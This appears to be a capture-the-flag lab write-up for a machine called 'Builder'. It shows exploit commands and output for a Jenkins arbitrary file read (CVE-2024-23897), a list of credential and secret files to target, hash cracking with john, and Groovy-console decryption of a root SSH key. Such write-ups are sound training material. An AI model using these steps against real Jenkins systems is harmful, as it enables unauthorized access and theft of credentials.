## Builder

### Lab Details 

- Difficulty: Medium    
- Type: Jenkins, LFI, Linux

#### Enumeration
- run nmap
- two ports on the machine port 22 and port 8080
- on port 8080 its hosting a Jenkins instance 
- on port 22 is SSH 
![[Jenkins dashboard.png]]
- Jenkins is running version 2.441
#### Initial Foothold 
- search online for `Jenkins version 2.441` we find a POC : https://www.exploit-db.com/exploits/51993
- Download and execute the POC we can perform LFI on target
```bash
$ python3 exploit.py -u http://10.129.41.36:8080/ -p /etc/passwd
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
root:x:0:0:root:/root:/bin/bash
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
jenkins:x:1000:1000::/var/jenkins_home:/bin/bash
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
```
- searching on this exploit against Jenkins, found POC: https://github.com/verylazytech/CVE-2024-23897 which references some interesting files to check out:
```
- /proc/self/environ Environmental variables including JENKINS_HOME
- /proc/self/cmdline Command-line arguments
- /var/jenkins_home/users/users.xml User account storage locations
- /var/jenkins_home/users/<user_directory>/config.xml User BCrypt password hash
- /var/jenkins_home/secrets/master.key Encryption secret key
- /etc/hosts Linux local-DNS resolution
- /etc/passwd Linux user accounts
```
- reading `/var/jenkins_home/users/users.xml` we get the directory for user `jennifer`
```bash
$ python3 exploit.py -u http://10.129.41.36:8080/ -p /var/jenkins_home/users/users.xml
<?xml version='1.1' encoding='UTF-8'?>
      <string>jennifer_12108429903186576833</string>
  <idToDirectoryNameMap class="concurrent-hash-map">
    <entry>
      <string>jennifer</string>
  <version>1</version>
</hudson.model.UserIdMapper>
  </idToDirectoryNameMap>
<hudson.model.UserIdMapper>
    </entry>
```
- with that info we can read `/var/jenkins_home/users/jennifer_12108429903186576833/config.xml`
```xml
  <io.jenkins.plugins.thememanager.ThemeUserProperty plugin="theme-manager@215.vc1ff18d67920"/>
      <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>
```
- we get the password for user `jennifer` which we can crack with `john`
```bash
$ john --show hash
?:princess

1 password hash cracked, 0 left
```
- we can then login to Jenkins Dashboard with `jennifer`
#### Lateral Movement (If any)

#### Privilege Escalation
- once logged in we can go to credentials tab and right click + inspect on the key
![[reading SSH key.png]]
- we can decrypt the ssh key in the GroovyShell (http://10.129.41.36:8080/manage/script) `println hudson.util.Secret.decrypt("{ENCRYPTED_VALUE}")`
![[SSH key.png]]
- we can then `SSH` into the target using the private key of root
```
$ ssh root@10.129.41.36 -i ./key 
```
#### Resources

#### Lesson Learned
- Jenkins Usage
